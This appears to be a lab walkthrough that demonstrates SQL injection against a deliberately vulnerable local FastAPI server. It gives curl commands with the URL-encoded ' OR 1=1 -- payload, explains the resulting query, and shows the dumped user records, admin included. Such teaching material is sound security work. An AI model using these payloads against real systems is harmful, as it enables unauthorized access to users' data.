## Prerequisites
First, ensure the vulnerable server (vulnerable.py) is running. This will create a vulnerable.db file in your directory.

```Bash
uvicorn vulnerable:app --reload
```

## Exploitation Steps
The goal is to inject a malicious SQL payload to bypass the search filter (WHERE clause) and dump all user records from the database, not just the one we're searching for.

1. Perform a Normal Search
Before the attack, we use the API as intended to search for a legitimate user, alice.

```Bash
curl "http://127.0.0.1:8000/users/search?username=alice"
```
Expected Response (Normal): The API correctly returns only the record for Alice.

```JSON
[
  {
    "id": 1,
    "username": "alice",
    "role": "user"
  }
]
```

2. Perform the Exploit (SQL Injection Attack)
Next, the attacker provides a specially crafted payload. This payload must be URL-encoded to be sent correctly via curl.

Note: The payload ' OR 1=1 -- is encoded as %27%20OR%201%3D1%20-- to handle the special characters (', space, =) in a URL.

```Bash
curl "http://127.0.0.1:8000/users/search?username=%27%20OR%201%3D1%20--"
```

The vulnerable code in vulnerable.py builds the following malicious query: SELECT ... FROM users WHERE username = '' OR 1=1 --'

The -- at the end comments out the final, trailing '. The database executes the query SELECT ... WHERE username = '' OR 1=1, which is true for every row.

3. Analyze the Result
The API incorrectly returns all user records from the database, including the admin.

Successful Exploit Response (Data Dumped):

```JSON
[
  {
    "id": 1,
    "username": "alice",
    "role": "user"
  },
  {
    "id": 2,
    "username": "bob",
    "role": "user"
  },
  {
    "id": 3,
    "username": "admin",
    "role": "admin"
  }
]
```

This confirms the exploit was successful. The API has leaked the data of all users, including their roles, confirming a critical SQL Injection vulnerability.